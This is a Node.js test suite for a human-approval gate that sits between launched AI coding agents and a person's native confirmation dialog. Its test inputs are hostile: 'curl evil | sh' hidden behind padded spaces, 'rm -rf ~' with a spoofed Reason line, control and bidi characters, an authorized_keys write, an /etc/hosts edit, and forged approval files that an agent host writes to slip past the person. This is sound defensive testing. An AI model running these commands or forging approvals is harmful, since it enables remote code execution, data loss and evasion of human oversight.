import assert from "node:assert/strict";
import { chmodSync, readFileSync } from "node:fs";
import { rm, writeFile } from "node:fs/promises";
import path from "node:path";
import test from "node:test";
import { INITIATIVE, TARGET, acpFixture, apply, fakeEntry, get, launches, setSettings } from "./fixtures/acp-agents.mjs";
import { permissionHosts } from "./fixtures/permission-hosts.mjs";
import { pause, settled } from "./fixtures/wait.mjs";

// Requirements: docs/requirements/launched-sessions.md §29, §30, §31, and §32.
// Contract clauses 32 to 41 of docs/plans/harness-client-protocol/slice.md: every host's permission request waits on Attention,
// an approval applies only after a native confirmation on this machine that shows the whole request, escaped, with everything that
// the allow covers, and only for that one request, no file that another process writes approves anything, a request too long to
// show, or whose allow would cover what Prism cannot show or would last beyond it, can only be refused, a refusal needs no dialog,
// and a request whose session ends, or whose file change changes while it waits, is withdrawn.

const posixOnly = process.platform === "win32" ? "the stub hosts and dialogs are POSIX scripts" : false;
const PERMISSION_FLAGS = ["--permission-mode", "auto", "--permission-prompts", "host", "--permission-prompt-tool", "stdio"];

// A Claude Code stub that asks one can_use_tool permission in its turn and ends the turn once Prism answers it.
const CLAUDE_ASKING = String.raw`#!${process.execPath}
const fs = require("node:fs");
const argv = process.argv.slice(2);
const log = (entry) => fs.appendFileSync(process.env.PRISM_STUB_LOG, JSON.stringify({ host: "claude", pid: process.pid, ...entry }) + "\n");
log({ kind: "run", argv, cwd: process.cwd(), env: {}, children: [] });
const write = (event) => process.stdout.write(JSON.stringify(event) + "\n");
const id = argv[argv.indexOf("--session-id") + 1];
let buffer = "";
process.stdin.on("data", (chunk) => {
  buffer += chunk;
  for (let end = buffer.indexOf("\n"); end >= 0; end = buffer.indexOf("\n")) {
    const message = JSON.parse(buffer.slice(0, end));
    buffer = buffer.slice(end + 1);
    log({ kind: "input", message });
    if (message.type === "user") {
      write({ type: "system", subtype: "init", session_id: id, model: "claude-opus-5-5" });
      write({ type: "control_request", request_id: "ask-1", request: { subtype: "can_use_tool", tool_name: "Write", display_name: "Write", input: { file_path: ".claude/settings.local.json", content: "{}" }, description: ".claude/settings.local.json", decision_reason: "Claude requested permissions to write to .claude/settings.local.json.", tool_use_id: "toolu_1" } });
    }
    if (message.type === "control_response" && message.response?.request_id === "ask-1") write({ type: "result", subtype: "success", is_error: false, result: "done", session_id: id, permission_denials: [] });
  }
});
process.stdin.on("end", () => { log({ kind: "closed", results: 1, interrupted: false }); setTimeout(() => process.exit(0), 20); });
`;

const attention = async (s) => (await get(s.base, "api/entity?ref=attention")).json.data;
const pending = (s) => settled(async () => (await attention(s)).permissions ?? [], (list) => list.length > 0);
const decide = (s, launch, request, decision) => apply(s.base, { action: "launch.permission", target: `launch:${launch}`, input: { request, decision }, revision: null }, s.headers);
const launchRun = async (s) => {
  const result = await apply(s.base, { action: "launch.run", target: TARGET(INITIATIVE), input: {}, revision: null }, s.headers);
  assert.equal(result.status, 200, result.text);
  return result.json.launch.id;
};

async function onAgent(t, plan) {
  const s = await acpFixture(t, { plans: { gemini: plan } });
  await s.declare([fakeEntry(s, "gemini", { label: "Gemini CLI" })]);
  await setSettings(s.root, INITIATIVE, { host: "acp-gemini" });
  return s;
}
async function onClaude(t) {
  const s = await acpFixture(t, { hosts: ["claude"] });
  const file = path.join(s.bin, "claude");
  await writeFile(file, CLAUDE_ASKING);
  chmodSync(file, 0o755);
  await setSettings(s.root, INITIATIVE, { host: "claude-code" });
  return s;
}
async function onCodex(t) {
  const s = await acpFixture(t, { hosts: ["codex"] });
  await s.setPlans({ codex: [{ askApproval: true, hold: "forever" }] });
  await setSettings(s.root, INITIATIVE, { host: "codex" });
  return s;
}
// A Codex run whose approval request the wrapper of permission-hosts.mjs replaces with the request and notifications of `plan`.
async function onCodexWith(t, plan) {
  const s = await onCodex(t);
  const hosts = await permissionHosts(s);
  await hosts.setPlan({ codex: plan });
  return s;
}
// An ACP run whose permission request the wrapper of permission-hosts.mjs rewrites under `plan`.
async function onAgentWith(t, plan) {
  const s = await acpFixture(t, { plans: { gemini: { permission: {} } } });
  const hosts = await permissionHosts(s);
  await hosts.setPlan({ acp: plan });
  await s.declare([{ ...fakeEntry(s, "gemini", { label: "Gemini CLI" }), command: hosts.acp }]);
  await setSettings(s.root, INITIATIVE, { host: "acp-gemini" });
  return s;
}
// The shown form of clause 33 for text with no control or format character: each backslash doubled.
const shownForm = (value) => value.replace(/\\/g, "\\\\");
const CHANGES = [
  { path: "src/report.txt", kind: { type: "update", move_path: null }, diff: "@@ -1 +1 @@\n-draft\n+final\n" },
  { path: "src/new.txt", kind: { type: "add" }, diff: "hello\n" }
];
const fileChange = (extra = {}) => ({ method: "item/fileChange/requestApproval", params: { itemId: "item_patch", startedAtMs: 1, reason: "Codex wants to edit two files.", ...extra } });
const patchStarted = (changes = CHANGES) => ({ method: "item/started", params: { startedAtMs: 1, item: { type: "fileChange", id: "item_patch", status: "inProgress", changes } } });
const inputsOf = (s, host) => s.runs(host).flatMap((run) => s.inputs(run.pid));
const claudeAnswer = (s) => settled(() => inputsOf(s, "claude").find((message) => message.type === "control_response"), Boolean);
// The text that the zenity stub was asked to show, as zenity shows it: its --text argument with Pango entities and doubled backslashes read back.
const dialogText = (dialog) => {
  const raw = dialog.argv.find((arg) => arg.startsWith("--text="))?.slice("--text=".length) ?? dialog.argv.join(" ");
  return raw.replace(/\\\\/g, "\\").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
};
const answers = (s) => s.entries().filter((entry) => entry.kind === "permission-answer");
const codexAnswer = (s) => settled(() => inputsOf(s, "codex").find((message) => message.id === "approval-1" && message.method === undefined), Boolean);

test("clause 32: Claude Code runs in auto mode with its permission prompts sent to Prism over its input", { skip: posixOnly }, async (t) => {
  const s = await onClaude(t);
  await launchRun(s);
  const [run] = await settled(() => s.runs("claude"), (runs) => runs.length === 1);
  for (let index = 0; index < PERMISSION_FLAGS.length; index += 2) {
    const at = run.argv.indexOf(PERMISSION_FLAGS[index]);
    assert.ok(at >= 0, `${PERMISSION_FLAGS[index]} is passed`);
    assert.equal(run.argv[at + 1], PERMISSION_FLAGS[index + 1]);
  }
  assert.ok(!run.argv.includes("none"), "no prompt is denied without the person");
});

test("clauses 33, 34: an ACP request waits on Attention with its initiative, host, and action, and counts as a question, in no shared record", { skip: posixOnly }, async (t) => {
  const s = await onAgent(t, { permission: { title: "Write probe.txt", kind: "edit" } });
  const id = await launchRun(s);
  const [request] = await pending(s);
  assert.match(request.id, /^perm-[0-9a-f]{16}$/);
  assert.deepEqual({ launch: request.launch, initiative: request.initiative.id, host: request.host, action: request.action }, { launch: id, initiative: INITIATIVE, host: { id: "acp-gemini", label: "Gemini CLI" }, action: "Write probe.txt" });
  assert.ok(!Number.isNaN(Date.parse(request.askedAt)));
  assert.equal((await get(s.base, "api/attention")).json.gates, 1);
  const shared = readFileSync(path.join(s.root, ".prism/initiatives", INITIATIVE, "state.json"), "utf8");
  assert.doesNotMatch(shared, /perm-|Write probe\.txt/);
  const viewed = await settled(async () => (await launches(s)).find((item) => item.id === id), (item) => item?.state === "waiting");
  assert.equal(viewed.reason, "Asks you to allow: Write probe.txt.");
});

test("clauses 35, 39: a decision on a request id that is not pending in the launch is refused", { skip: posixOnly }, async (t) => {
  const s = await onAgent(t, { permission: {} });
  const id = await launchRun(s);
  await pending(s);
  const refused = await decide(s, id, "perm-0000000000000000", "approve");
  assert.deepEqual([refused.status, refused.json.code], [404, "unknown_request"]);
  const other = await decide(s, "launch-0000000000000000", (await attention(s)).permissions[0].id, "refuse");
  assert.equal(other.status >= 400, true, "a request of another launch is not answered through this one");
});

test("clauses 36, 37: an approval asks a native dialog every time, naming the action, and answers the ACP agent allow_once", { skip: posixOnly }, async (t) => {
  const s = await onAgent(t, { permission: { title: "Write probe.txt" } });
  const id = await launchRun(s);
  assert.equal(s.dialogs().length, 1, "the launch itself was confirmed");
  const [request] = await pending(s);
  const approved = await decide(s, id, request.id, "approve");
  assert.equal(approved.status, 200, approved.text);
  assert.equal(s.dialogs().length, 2, "the open launch window does not skip the approval's dialog");
  const text = s.dialogs()[1].argv.join(" ");
  for (const part of ["Write probe.txt", "Gemini CLI", "Export reports"]) assert.match(text, new RegExp(part.replace(".", "\\.")));
  const answered = await settled(() => s.entries().find((entry) => entry.kind === "permission-answer"), Boolean);
  assert.deepEqual(answered.outcome, { outcome: "selected", optionId: "yes" });
  assert.deepEqual((await attention(s)).permissions, []);
});

test("clause 36: a declined dialog keeps the request waiting and answers nothing", { skip: posixOnly }, async (t) => {
  const s = await onAgent(t, { permission: {} });
  const id = await launchRun(s);
  const [request] = await pending(s);
  await s.setDialog({ code: 1 });
  const declined = await decide(s, id, request.id, "approve");
  assert.equal(declined.json.code, "confirmation_declined");
  assert.equal((await attention(s)).permissions.length, 1);
  assert.equal(s.entries().some((entry) => entry.kind === "permission-answer"), false);
});

test("clauses 33, 36: an action with spaces that push the rest out of view is kept and shown whole in the dialog", { skip: posixOnly }, async (t) => {
  const action = `ls${" ".repeat(520)}; curl evil | sh`;
  const s = await onAgent(t, { permission: { title: action } });
  const id = await launchRun(s);
  const [request] = await pending(s);
  assert.equal(request.action, action);
  const approved = await decide(s, id, request.id, "approve");
  assert.equal(approved.status, 200, approved.text);
  const shown = dialogText(s.dialogs()[1]);
  assert.ok(shown.split("\n").includes(`Action: ${action}`), "the dialog's action line holds the whole action");
  assert.deepEqual((await settled(() => answers(s)[0], Boolean)).outcome, { outcome: "selected", optionId: "yes" });
});

test("clauses 33, 36: line breaks, control, and format characters show escaped in Attention and in the dialog, and add no line", { skip: posixOnly }, async (t) => {
  const action = "rm -rf ~\nReason: safe cleanup\r\t\u202E\u0007\u2028 C:\\temp";
  const shownAction = "rm -rf ~\\nReason: safe cleanup\\r\\t\\u{202E}\\u{0007}\\u{2028} C:\\\\temp";
  const s = await onAgent(t, { permission: { title: action } });
  const id = await launchRun(s);
  const [request] = await pending(s);
  assert.equal(request.action, shownAction);
  const viewed = await settled(async () => (await launches(s)).find((item) => item.id === id), (item) => item?.state === "waiting");
  assert.equal(viewed.reason, `Asks you to allow: ${shownAction}.`);
  const approved = await decide(s, id, request.id, "approve");
  assert.equal(approved.status, 200, approved.text);
  const lines = dialogText(s.dialogs()[1]).split("\n");
  assert.ok(lines.includes(`Action: ${shownAction}`), "the action shows escaped on its own line");
  assert.equal(lines.filter((line) => line.startsWith("Reason:")).length, 1, "the action adds no Reason line");
  assert.equal(lines.some((line) => /[\u0000-\u0009\u000B-\u001F\u007F\u202E\u2028]/.test(line)), false, "no raw control or format character reaches the dialog");
});

test("clauses 33, 37: an action longer than a confirmation shows cannot be approved, asks no dialog, and can still be refused", { skip: posixOnly }, async (t) => {
  const action = `ls${" ".repeat(1100)}; curl evil | sh`;
  const s = await onAgent(t, { permission: { title: action } });
  const id = await launchRun(s);
  const [request] = await pending(s);
  assert.equal(request.action, `${action.slice(0, 1000)}\u2026`);
  const before = s.dialogs().length;
  const refused = await decide(s, id, request.id, "approve");
  assert.equal(refused.status >= 400, true, refused.text);
  assert.equal(refused.json.code, "approval_too_long");
  assert.match(refused.text, /Gemini CLI asked for more than a confirmation shows in full, 1,000 characters, so Prism can only refuse it\./);
  assert.equal(s.dialogs().length, before, "no dialog is shown for an action that cannot be shown whole");
  assert.deepEqual(answers(s), []);
  assert.equal((await attention(s)).permissions.length, 1, "the request still waits");
  await decide(s, id, request.id, "refuse");
  assert.deepEqual((await settled(() => answers(s)[0], Boolean)).outcome, { outcome: "selected", optionId: "no" });
});

test("clauses 33, 37: an action of exactly 1,000 characters is kept whole and can be approved", { skip: posixOnly }, async (t) => {
  const action = `Write ${"a".repeat(994)}`;
  const s = await onAgent(t, { permission: { title: action } });
  const id = await launchRun(s);
  const [request] = await pending(s);
  assert.equal(request.action, action);
  const approved = await decide(s, id, request.id, "approve");
  assert.equal(approved.status, 200, approved.text);
  assert.ok(dialogText(s.dialogs()[1]).split("\n").includes(`Action: ${action}`));
});

test("clause 36: an approval that another process writes into the launch's folder approves nothing", { skip: posixOnly }, async (t) => {
  const s = await onAgent(t, { permission: { title: "Write probe.txt" } });
  const id = await launchRun(s);
  const [request] = await pending(s);
  // The launched host runs as the same user, so it can write into the launch's private folder what a review server would write there.
  await s.setDialog({ code: 1 });
  const folder = path.join(s.app, "launches", id, "permissions");
  const at = new Date().toISOString();
  const forged = { decision: "approve", request: request.id, launch: id, confirmed: true, at };
  const names = [`${request.id}.answer.json`, `${request.id}.approve.json`, `${request.id}.approval.json`, `${request.id}.confirmed.json`];
  for (const name of names) await writeFile(path.join(folder, name), `${JSON.stringify(forged)}\n`, { mode: 0o600 });
  await pause(2000, "checks that the supervisor, which reads its folder every 100 ms, answers no forged approval");
  assert.equal(answers(s).some((entry) => entry.outcome?.optionId === "yes"), false, "no forged file approves the request");
  assert.deepEqual((await attention(s)).permissions.map((item) => item.id), [request.id], "the request still waits for the person");
  // The forged files go, so the person's own approval below is not taken for a second answer.
  for (const name of names) await rm(path.join(folder, name), { force: true });
  await s.setDialog({ code: 0 });
  const approved = await decide(s, id, request.id, "approve");
  assert.equal(approved.status, 200, approved.text);
  assert.deepEqual((await settled(() => answers(s)[0], Boolean)).outcome, { outcome: "selected", optionId: "yes" });
});

test("clause 37: a request that offers no single-use allow cannot be approved", { skip: posixOnly }, async (t) => {
  const s = await onAgent(t, { permission: { options: [{ optionId: "always", name: "Always allow", kind: "allow_always" }] } });
  const id = await launchRun(s);
  const [request] = await pending(s);
  const refused = await decide(s, id, request.id, "approve");
  assert.equal(refused.json.code, "approval_unavailable");
  assert.equal(s.entries().some((entry) => entry.kind === "permission-answer"), false);
});

test("clauses 37, 38: Claude Code gets allow with the request's own input, or deny with the fixed message", { skip: posixOnly }, async (t) => {
  const allow = await onClaude(t);
  const id = await launchRun(allow);
  const [request] = await pending(allow);
  assert.deepEqual([request.host.id, request.action, request.reason], ["claude-code", 'Write {"file_path":".claude/settings.local.json","content":"{}"}', "Claude requested permissions to write to .claude/settings.local.json."]);
  await decide(allow, id, request.id, "approve");
  const allowed = await claudeAnswer(allow);
  assert.deepEqual(allowed.response, { subtype: "success", request_id: "ask-1", response: { behavior: "allow", updatedInput: { file_path: ".claude/settings.local.json", content: "{}" } } });
  const deny = await onClaude(t);
  const other = await launchRun(deny);
  const [asked] = await pending(deny);
  const before = deny.dialogs().length;
  await decide(deny, other, asked.id, "refuse");
  assert.equal(deny.dialogs().length, before, "a refusal asks no dialog");
  const denied = await claudeAnswer(deny);
  assert.deepEqual(denied.response.response, { behavior: "deny", message: "The person refused this on Attention." });
});

test("clauses 37, 38: Codex gets accept for an approval and decline for a refusal", { skip: posixOnly }, async (t) => {
  for (const [decision, expected] of [["approve", "accept"], ["refuse", "decline"]]) {
    const s = await onCodex(t);
    const id = await launchRun(s);
    const [request] = await pending(s);
    assert.deepEqual([request.host.id, request.action], ["codex", "touch /etc/hosts"]);
    await decide(s, id, request.id, decision);
    const answered = await codexAnswer(s);
    assert.deepEqual(answered.result, { decision: expected });
  }
});

test("clause 33: a Codex file change shows the paths and diffs of its item, which Codex sent before the request, and an approval answers accept", { skip: posixOnly }, async (t) => {
  const s = await onCodexWith(t, { before: [patchStarted()], request: fileChange() });
  const id = await launchRun(s);
  const [request] = await pending(s);
  const action = shownForm(`File change ${JSON.stringify({ changes: CHANGES })}`);
  assert.deepEqual([request.host.id, request.action, request.reason], ["codex", action, "Codex wants to edit two files."]);
  const approved = await decide(s, id, request.id, "approve");
  assert.equal(approved.status, 200, approved.text);
  assert.ok(dialogText(s.dialogs().at(-1)).split("\n").includes(`Action: ${action}`), "the dialog shows every path and diff that the allow covers");
  assert.deepEqual((await codexAnswer(s)).result, { decision: "accept" });
});

test("clauses 33, 37: a Codex file change whose item Prism did not see cannot be approved, asks no dialog, and can be refused", { skip: posixOnly }, async (t) => {
  const s = await onCodexWith(t, { request: fileChange() });
  const id = await launchRun(s);
  const [request] = await pending(s);
  assert.equal(request.action, "A file change that Codex did not describe");
  const before = s.dialogs().length;
  const refused = await decide(s, id, request.id, "approve");
  assert.equal(refused.json.code, "approval_unavailable");
  assert.match(refused.text, /Codex did not say which files this change writes, so Prism can only refuse it\./);
  assert.equal(s.dialogs().length, before, "no dialog is shown");
  assert.equal((await attention(s)).permissions.length, 1, "the request still waits");
  await decide(s, id, request.id, "refuse");
  assert.deepEqual((await codexAnswer(s)).result, { decision: "decline" });
});

test("clauses 33, 37: a Codex file change that asks for writes under a folder for the rest of the session shows the folder and can only be refused", { skip: posixOnly }, async (t) => {
  const s = await onCodexWith(t, { before: [patchStarted()], request: fileChange({ grantRoot: "/home/person" }) });
  const id = await launchRun(s);
  const [request] = await pending(s);
  assert.equal(request.action, shownForm(`File change ${JSON.stringify({ changes: CHANGES, grantRoot: "/home/person" })}`));
  const before = s.dialogs().length;
  const refused = await decide(s, id, request.id, "approve");
  assert.equal(refused.json.code, "approval_unavailable");
  assert.match(refused.text, /Codex asks to allow writes under \/home\/person for the rest of the session, so Prism can only refuse it\./);
  assert.equal(s.dialogs().length, before, "no dialog is shown for an allow that lasts beyond the request");
  const inputs = inputsOf(s, "codex");
  assert.equal(inputs.some((message) => message.id === "approval-1" && message.method === undefined), false, "Codex is answered nothing");
  await decide(s, id, request.id, "refuse");
  assert.deepEqual((await codexAnswer(s)).result, { decision: "decline" });
});

test("clause 40: a Codex file change whose patch changes while its request waits is declined and withdrawn", { skip: posixOnly }, async (t) => {
  const changed = [{ path: "/etc/hosts", kind: { type: "update", move_path: null }, diff: "+0.0.0.0 example.com\n" }];
  const s = await onCodexWith(t, { before: [patchStarted()], request: fileChange(), after: [{ method: "item/fileChange/patchUpdated", params: { itemId: "item_patch", changes: changed } }] });
  await launchRun(s);
  await pending(s);
  assert.deepEqual((await codexAnswer(s))?.result, { decision: "decline" }, "Codex is told the changed patch was declined");
  assert.deepEqual(await settled(async () => (await attention(s)).permissions, (list) => list.length === 0), []);
});

test("clause 33: an ACP request shows the tool call's raw input after its title, and an approval answers allow_once", { skip: posixOnly }, async (t) => {
  const rawInput = { file_path: "/home/person/.ssh/authorized_keys", content: "ssh-ed25519 AAAA" };
  const s = await onAgentWith(t, { toolCall: { toolCallId: "t1", title: "Write file", kind: "edit", rawInput } });
  const id = await launchRun(s);
  const [request] = await pending(s);
  const action = `Write file ${JSON.stringify(rawInput)}`;
  assert.equal(request.action, action);
  const approved = await decide(s, id, request.id, "approve");
  assert.equal(approved.status, 200, approved.text);
  assert.ok(dialogText(s.dialogs().at(-1)).split("\n").includes(`Action: ${action}`), "the dialog shows the input that the allow covers");
  assert.deepEqual((await settled(() => answers(s)[0], Boolean)).outcome, { outcome: "selected", optionId: "yes" });
});

test("clause 33: an ACP request that names only its tool call takes the title, kind, and raw input of that call's earlier updates", { skip: posixOnly }, async (t) => {
  const rawInput = { command: "rm -rf build" };
  const before = [
    { sessionUpdate: "tool_call", toolCallId: "t1", title: "Run a command", kind: "execute", status: "pending" },
    { sessionUpdate: "tool_call", toolCallId: "t0", title: "Other call", kind: "read", rawInput: { path: "x" } },
    { sessionUpdate: "tool_call_update", toolCallId: "t1", rawInput }
  ];
  const s = await onAgentWith(t, { before, toolCall: { toolCallId: "t1" } });
  await launchRun(s);
  const [request] = await pending(s);
  assert.deepEqual([request.action, request.reason], [`Run a command ${JSON.stringify(rawInput)}`, "Gemini CLI asks before it runs a tool of kind execute."]);
});

test("clause 38: a refusal answers an ACP agent with its reject_once option, else cancelled", { skip: posixOnly }, async (t) => {
  const s = await onAgent(t, { permission: {} });
  const id = await launchRun(s);
  await decide(s, id, (await pending(s))[0].id, "refuse");
  assert.deepEqual((await settled(() => s.entries().find((entry) => entry.kind === "permission-answer"), Boolean)).outcome, { outcome: "selected", optionId: "no" });
  const bare = await onAgent(t, { permission: { options: [{ optionId: "yes", name: "Allow", kind: "allow_once" }] } });
  const other = await launchRun(bare);
  await decide(bare, other, (await pending(bare))[0].id, "refuse");
  assert.deepEqual((await settled(() => bare.entries().find((entry) => entry.kind === "permission-answer"), Boolean)).outcome, { outcome: "cancelled" });
});

test("clause 40: stopping a session withdraws its waiting request and refuses it to the host", { skip: posixOnly }, async (t) => {
  const s = await onAgent(t, { permission: {}, hold: true });
  const id = await launchRun(s);
  await pending(s);
  const stopped = await apply(s.base, { action: "launch.stop", target: `launch:${id}`, input: {}, revision: null }, s.headers);
  assert.equal(stopped.status, 200, stopped.text);
  await settled(async () => (await attention(s)).permissions.length, 0);
  assert.deepEqual((await attention(s)).permissions, []);
  const answered = await settled(() => s.entries().find((entry) => entry.kind === "permission-answer"), Boolean);
  assert.deepEqual(answered.outcome, { outcome: "selected", optionId: "no" });
});

test("clause 41: each decision is recorded in the initiative's history with its decision and action", { skip: posixOnly }, async (t) => {
  const s = await onAgent(t, { permission: { title: "Write probe.txt" } });
  const id = await launchRun(s);
  await decide(s, id, (await pending(s))[0].id, "refuse");
  const { readCoordinationState } = await import("../../dist/server/workflow/state.mjs");
  const history = (await readCoordinationState({ projectRoot: s.root, initiative: INITIATIVE })).state.history ?? [];
  const entry = history.find((item) => item.action === "launch.permission");
  assert.ok(entry, "the decision is in the history");
  assert.match(JSON.stringify(entry), /refuse/);
  assert.match(JSON.stringify(entry), /Write probe\.txt/);
});
